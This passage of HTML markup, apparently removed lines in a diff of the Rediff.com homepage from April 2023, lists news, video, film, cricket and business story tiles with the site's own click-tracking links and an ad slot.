-            <div class="nbox" data-boxno="4_3" data-track="label=videos&c_type=ishare&c_id=11226951">
-                <p class="more">
-                    <a href="https://ishare.rediff.com" class="backvid" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=4_3_L&label=videos&c_type=ishare&property=hp_in_pc');return false;" title="More on Videos">Videos</a>
-                </p>
-                <h5 class="relative">
-                    <a href="https://ishare.rediff.com/video/others/caught-on-cam-korean-blogger-harassed-in-jodhpur/11226951" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/caught-on-cam-korean-blogger-harassed-in-jodhpur/11226951___&position=4_3_I&label=videos&c_type=ishare&c_id=11226951&property=hp_in_pc');return false;" data-relsrc="http://datastore.rediff.com/h300-w300/thumb/53615D675B5B615F706460626D72/5320g0z5b7af7ing.D.147000.Shameful-incident-caught-on-cam-Korean-blogger-harassed-in-Rajasthan-s-Jodhpur--probe-underway.mp4-0008.png" class="img vdplayicon">
-                        <img alt="Caught on cam: Korean blogger harassed in Jodhpur" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://ishare.rediff.com/video/others/caught-on-cam-korean-blogger-harassed-in-jodhpur/11226951" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/caught-on-cam-korean-blogger-harassed-in-jodhpur/11226951___&position=4_3_T&label=videos&c_type=ishare&c_id=11226951&property=hp_in_pc');return false;">Caught on cam: Korean blogger harassed in Jodhpur</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="4_4" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fileana-dcruz-is-pregnant%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=4_4_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" class="backmovies" href="https://www.rediff.com/movies">movies</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fileana-dcruz-is-pregnant%2F20230418.htm___&position=4_4_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/movies/2023/apr/18ileana-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/ileana-dcruz-is-pregnant/20230418.htm">
-                        <img alt="Ileana D'Cruz Is Pregnant" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fileana-dcruz-is-pregnant%2F20230418.htm___&position=4_4_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" href="https://www.rediff.com/movies/report/ileana-dcruz-is-pregnant/20230418.htm">Ileana D'Cruz Is Pregnant</a>
-                </h2>
-            </div>
-            <div id="native_0" class="nbox hide" data-boxno="4_5" data-track="label=lifestyletips&c_type=shopping_native&news=https%3A%2F%2Fwww.rediff.com%2Ftravel-living%2Freport%2F8-must-have-products-for-cleaner-and-spacious-car%2F20190625.htm">
-                <p class="more">
-                    <a href="https://www.rediff.com/travel-living" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Ftravel-living?sc_cid=inhome_ntv_4_5_L_lifestyletips___&position=4_5_L&label=lifestyletips&c_type=shopping_native&property=hp_in_pc');return false;">#LifestyleTips</a>
-                </p>
-                <h5>
-                    <a data-relsrc="http://im.rediff.com/240-170/travel-living/2019/jun/25car-1149997960720.jpg" class="img" href="https://www.rediff.com/travel-living/report/8-must-have-products-for-cleaner-and-spacious-car/20190625.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Ftravel-living%2Freport%2F8-must-have-products-for-cleaner-and-spacious-car%2F20190625.htm?sc_cid=inhome_ntv_4_5_I_lifestyletips___&position=4_5_I&label=lifestyletips&c_type=shopping_native&property=hp_in_pc');return false;">
-                        <img alt="8 must have car accessories for cleaner and spacious car" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/travel-living/report/8-must-have-products-for-cleaner-and-spacious-car/20190625.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Ftravel-living%2Freport%2F8-must-have-products-for-cleaner-and-spacious-car%2F20190625.htm?sc_cid=inhome_ntv_4_5_T_lifestyletips___&position=4_5_T&label=lifestyletips&c_type=shopping_native&property=hp_in_pc');return false;">8 must have car accessories for cleaner and spacious car</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="div_advt_middle">
-                <ins data-revive-zoneid="75" data-revive-source="_blank" data-revive-target="_blank" data-revive-id="4b71f4079fb345c8ac958d0e9f0b56dd" data-zonename="Rediff_Home_728x90_Middle_IN"></ins>
-            </div>
-            <div class="nbox" data-boxno="5_1" data-track="label=videos&c_type=ishare&c_id=11226943">
-                <p class="more">
-                    <a href="https://ishare.rediff.com" class="backvid" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=5_1_L&label=videos&c_type=ishare&property=hp_in_pc');return false;" title="More on Videos">Videos</a>
-                </p>
-                <h5 class="relative">
-                    <a href="https://ishare.rediff.com/video/others/tim-cook-opens-gates-to-india-s-first-apple-store-in-mumbai/11226943" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/tim-cook-opens-gates-to-india-s-first-apple-store-in-mumbai/11226943___&position=5_1_I&label=videos&c_type=ishare&c_id=11226943&property=hp_in_pc');return false;" data-relsrc="http://datastore.rediff.com/h300-w300/thumb/53615D675B5B615F706460626D72/e7fsv737jzu9xr8k.D.78000.CEO-Tim-Cook-opens-gates-of-India-s-first-Apple-Store-at-Mumbai-s-BKC.mp4-0005.png" class="img vdplayicon">
-                        <img alt="Tim Cook opens gates to India's first Apple store in Mumbai" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://ishare.rediff.com/video/others/tim-cook-opens-gates-to-india-s-first-apple-store-in-mumbai/11226943" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/tim-cook-opens-gates-to-india-s-first-apple-store-in-mumbai/11226943___&position=5_1_T&label=videos&c_type=ishare&c_id=11226943&property=hp_in_pc');return false;">Tim Cook opens gates to India's first Apple store in Mumbai</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="5_2" data-track="label=videos&c_type=ishare&c_id=11226835">
-                <p class="more">
-                    <a href="https://ishare.rediff.com" class="backvid" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=5_2_L&label=videos&c_type=ishare&property=hp_in_pc');return false;" title="More on Videos">Videos</a>
-                </p>
-                <h5 class="relative">
-                    <a href="https://ishare.rediff.com/video/others/seerat-naaz-the-viral-girl-from-j-k-aspires-to-be-an-ias-officer/11226835" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/seerat-naaz-the-viral-girl-from-j-k-aspires-to-be-an-ias-officer/11226835___&position=5_2_I&label=videos&c_type=ishare&c_id=11226835&property=hp_in_pc');return false;" data-relsrc="http://datastore.rediff.com/h300-w300/thumb/53615D675B5B615F706460626D72/iow03ckhrswyxet0.D.309000.Improve-our-schools--we-want-to-prepare-for-IAS-Kathua-Girl.mp4-0003.png" class="img vdplayicon">
-                        <img alt="Seerat Naaz, the viral girl from J-K, aspires to be an IAS officer" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://ishare.rediff.com/video/others/seerat-naaz-the-viral-girl-from-j-k-aspires-to-be-an-ias-officer/11226835" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/seerat-naaz-the-viral-girl-from-j-k-aspires-to-be-an-ias-officer/11226835___&position=5_2_T&label=videos&c_type=ishare&c_id=11226835&property=hp_in_pc');return false;">Seerat Naaz, the viral girl from J-K, aspires to be an IAS officer</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="5_3" data-track="label=videos&c_type=ishare&c_id=11226834">
-                <p class="more">
-                    <a href="https://ishare.rediff.com" class="backvid" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=5_3_L&label=videos&c_type=ishare&property=hp_in_pc');return false;" title="More on Videos">Videos</a>
-                </p>
-                <h5 class="relative">
-                    <a href="https://ishare.rediff.com/video/others/kkbkkj-cast-shares-candid-moments-of-shooting-with-salman/11226834" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/kkbkkj-cast-shares-candid-moments-of-shooting-with-salman/11226834___&position=5_3_I&label=videos&c_type=ishare&c_id=11226834&property=hp_in_pc');return false;" data-relsrc="http://datastore.rediff.com/h300-w300/thumb/53615D675B5B615F706460626D72/imz65v3fbblrpqyk.D.564000.Kisi-Ka-Bhai-Kisi-Ki-Jaan-cast-shares-candid-moments-of-shooting-with-Bhaijaan-Salman-Khan.mp4-0000.png" class="img vdplayicon">
-                        <img alt="KKBKKJ cast shares candid moments of shooting with Salman" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://ishare.rediff.com/video/others/kkbkkj-cast-shares-candid-moments-of-shooting-with-salman/11226834" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/kkbkkj-cast-shares-candid-moments-of-shooting-with-salman/11226834___&position=5_3_T&label=videos&c_type=ishare&c_id=11226834&property=hp_in_pc');return false;">KKBKKJ cast shares candid moments of shooting with Salman</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="5_4" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fwhen-madhuri-dixit-tempted-tim-cook-with-vada-pav%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=5_4_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" class="backgetahead" href="https://www.rediff.com/getahead">get ahead</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fwhen-madhuri-dixit-tempted-tim-cook-with-vada-pav%2F20230418.htm___&position=5_4_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/getahead/2023/apr/18vada-pav1.jpg" class="img" href="https://www.rediff.com/getahead/report/when-madhuri-dixit-tempted-tim-cook-with-vada-pav/20230418.htm">
-                        <img alt="When Madhuri Tempted Tim With Vada Pav" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fwhen-madhuri-dixit-tempted-tim-cook-with-vada-pav%2F20230418.htm___&position=5_4_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" href="https://www.rediff.com/getahead/report/when-madhuri-dixit-tempted-tim-cook-with-vada-pav/20230418.htm">When Madhuri Tempted Tim With Vada Pav</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="5_5" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fafter-adipurush-saif-joins-ntr-30%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=5_5_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" class="backmovies" href="https://www.rediff.com/movies">movies</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fafter-adipurush-saif-joins-ntr-30%2F20230418.htm___&position=5_5_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/movies/2023/apr/18ntr-saif-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/after-adipurush-saif-joins-ntr-30/20230418.htm">
-                        <img alt="After Adipurush, Saif Joins NTR 30" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fafter-adipurush-saif-joins-ntr-30%2F20230418.htm___&position=5_5_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" href="https://www.rediff.com/movies/report/after-adipurush-saif-joins-ntr-30/20230418.htm">After Adipurush, Saif Joins NTR 30</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="nbox" data-boxno="6_1" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Felon-musks-spacexs-starship-is-ready-to-launch%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=6_1_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;" class="backnews" href="https://www.rediff.com/news">news</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Felon-musks-spacexs-starship-is-ready-to-launch%2F20230418.htm___&position=6_1_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/news/2023/apr/18space-x-starship1.jpg" class="img" href="https://www.rediff.com/news/report/elon-musks-spacexs-starship-is-ready-to-launch/20230418.htm">
-                        <img alt="SpaceX's Starship Is Ready To Launch" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Felon-musks-spacexs-starship-is-ready-to-launch%2F20230418.htm___&position=6_1_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;" href="https://www.rediff.com/news/report/elon-musks-spacexs-starship-is-ready-to-launch/20230418.htm">SpaceX's Starship Is Ready To Launch</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="6_2" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-dil-toh-baccha-hai-ji-kohlis-day-out%2F20230417.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=6_2_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" class="backcricket" href="https://www.rediff.com/cricket">cricket</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-dil-toh-baccha-hai-ji-kohlis-day-out%2F20230417.htm___&position=6_2_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/17virat-kohli1.jpg" class="img" href="https://www.rediff.com/cricket/report/ipl-2023-dil-toh-baccha-hai-ji-kohlis-day-out/20230417.htm">
-                        <img alt="'Dil toh baccha hai ji': Kohli's Day Out" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-dil-toh-baccha-hai-ji-kohlis-day-out%2F20230417.htm___&position=6_2_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" href="https://www.rediff.com/cricket/report/ipl-2023-dil-toh-baccha-hai-ji-kohlis-day-out/20230417.htm">'Dil toh baccha hai ji': Kohli's Day Out</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="6_3" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fmalaika-arjun-romance-in-the-lift%2F20230417.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=6_3_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" class="backmovies" href="https://www.rediff.com/movies">movies</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fmalaika-arjun-romance-in-the-lift%2F20230417.htm___&position=6_3_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/movies/2023/apr/17insta-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/malaika-arjun-romance-in-the-lift/20230417.htm">
-                        <img alt="Malaika-Arjun Romance In The Lift!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fmalaika-arjun-romance-in-the-lift%2F20230417.htm___&position=6_3_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" href="https://www.rediff.com/movies/report/malaika-arjun-romance-in-the-lift/20230417.htm">Malaika-Arjun Romance In The Lift!</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="6_4" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fadhunas-summer-ready-hair-hacks%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=6_4_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" class="backgetahead" href="https://www.rediff.com/getahead">get ahead</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fadhunas-summer-ready-hair-hacks%2F20230418.htm___&position=6_4_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/getahead/2023/apr/15adhuna-lead1.jpg" class="img" href="https://www.rediff.com/getahead/report/adhunas-summer-ready-hair-hacks/20230418.htm">
-                        <img alt="Adhuna's Summer-Ready Hair Hacks " src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fadhunas-summer-ready-hair-hacks%2F20230418.htm___&position=6_4_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" href="https://www.rediff.com/getahead/report/adhunas-summer-ready-hair-hacks/20230418.htm">Adhuna's Summer-Ready Hair Hacks </a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="6_5" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Fcolumn%2Ftamal-bandyopadhyay-tough-times-lie-ahead-for-banking-sector%2F20230417.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/business___&position=6_5_L&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;" class="backbusiness" href="https://www.rediff.com/business">business</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Fcolumn%2Ftamal-bandyopadhyay-tough-times-lie-ahead-for-banking-sector%2F20230417.htm___&position=6_5_I&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/money/2023/apr/17nirmala-sitharaman-shaktikanta-das.jpg" class="img" href="https://www.rediff.com/business/column/tamal-bandyopadhyay-tough-times-lie-ahead-for-banking-sector/20230417.htm">
-                        <img alt="Tough Times Lie Ahead For Banking Sector" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Fcolumn%2Ftamal-bandyopadhyay-tough-times-lie-ahead-for-banking-sector%2F20230417.htm___&position=6_5_T&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;" href="https://www.rediff.com/business/column/tamal-bandyopadhyay-tough-times-lie-ahead-for-banking-sector/20230417.htm">Tough Times Lie Ahead For Banking Sector</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox news">
-                <h3>News</h3>
-                <i class="clear"></i>
-                <h2 class="news" data-boxno="7_1-2_1" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fis-ajit-pawar-joining-bjp-sharad-pawar-says%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/is-ajit-pawar-joining-bjp-sharad-pawar-says/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fis-ajit-pawar-joining-bjp-sharad-pawar-says%2F20230418.htm___&position=7_1-2_1&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Is Ajit Pawar joining BJP? Sharad Pawar says...</a>
-                </h2>
-                <h2 class="news" data-boxno="7_1-2_2" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Ftill-i-am-alive-ajit-pawar-amid-talk-of-rift-in-ncp%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/till-i-am-alive-ajit-pawar-amid-talk-of-rift-in-ncp/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Ftill-i-am-alive-ajit-pawar-amid-talk-of-rift-in-ncp%2F20230418.htm___&position=7_1-2_2&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Till I am alive...: Ajit Pawar amid talk of NCP rift</a>
-                </h2>
-                <h2 class="news" data-boxno="7_1-2_3" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fnia-takes-over-probe-on-indian-mission-attack-in-london%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/nia-takes-over-probe-on-indian-mission-attack-in-london/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fnia-takes-over-probe-on-indian-mission-attack-in-london%2F20230418.htm___&position=7_1-2_3&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">NIA takes over probe into Indian mission attack in UK</a>
-                </h2>
-                <h2 class="news" data-boxno="7_1-2_4" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fmissing-indian-mountaineer-found-alive-atop-mt-annapurna-in-nepal%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/missing-indian-mountaineer-found-alive-atop-mt-annapurna-in-nepal/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fmissing-indian-mountaineer-found-alive-atop-mt-annapurna-in-nepal%2F20230418.htm___&position=7_1-2_4&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Indian mountaineer found alive on Mt Annapurna</a>
-                </h2>
-                <h2 class="news" data-boxno="7_1-2_5" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fatiqs-in-case-i-am-killed-letter-being-sent-to-cji-yogi%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/atiqs-in-case-i-am-killed-letter-being-sent-to-cji-yogi/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fatiqs-in-case-i-am-killed-letter-being-sent-to-cji-yogi%2F20230418.htm___&position=7_1-2_5&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Atiq's in-case-of-death letter mailed to CJI, Yogi</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/news/" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2F___&position=7_1-2_M&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">More News</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="7_3" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwhy-have-these-people-gathered%2F20230418.htm">
-                <p class="more">
-                    <a class="backnews" href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=7_3_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">news</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/news/2023/apr/18dk-shivakuamr.jpg" class="img" href="https://www.rediff.com/news/report/why-have-these-people-gathered/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwhy-have-these-people-gathered%2F20230418.htm___&position=7_3_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">
-                        <img alt="Why Have These People Gathered?" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/news/report/why-have-these-people-gathered/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwhy-have-these-people-gathered%2F20230418.htm___&position=7_3_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Why Have These People Gathered?</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="7_4" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Fcolumn%2Faakar-patel-modis-new-target-digital-media%2F20230418.htm">
-                <p class="more">
-                    <a class="backnews" href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=7_4_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">news</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/money/2021/nov/11game-online-regulation.jpg" class="img" href="https://www.rediff.com/news/column/aakar-patel-modis-new-target-digital-media/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Fcolumn%2Faakar-patel-modis-new-target-digital-media%2F20230418.htm___&position=7_4_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">
-                        <img alt="Modi's New Target: Digital Media" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/news/column/aakar-patel-modis-new-target-digital-media/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Fcolumn%2Faakar-patel-modis-new-target-digital-media%2F20230418.htm___&position=7_4_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Modi's New Target: Digital Media</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="7_5" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fseventeenth-lok-sabha-likely-to-be-shortest-since-1952%2F20230418.htm">
-                <p class="more">
-                    <a class="backnews" href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=7_5_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">news</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/news/2023/mar/23lok-sabha.jpg" class="img" href="https://www.rediff.com/news/report/seventeenth-lok-sabha-likely-to-be-shortest-since-1952/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fseventeenth-lok-sabha-likely-to-be-shortest-since-1952%2F20230418.htm___&position=7_5_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">
-                        <img alt="17th Lok Sabha likely to be shortest since 1952" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/news/report/seventeenth-lok-sabha-likely-to-be-shortest-since-1952/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fseventeenth-lok-sabha-likely-to-be-shortest-since-1952%2F20230418.htm___&position=7_5_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">17th Lok Sabha likely to be shortest since 1952</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox news">
-                <h3>News</h3>
-                <i class="clear"></i>
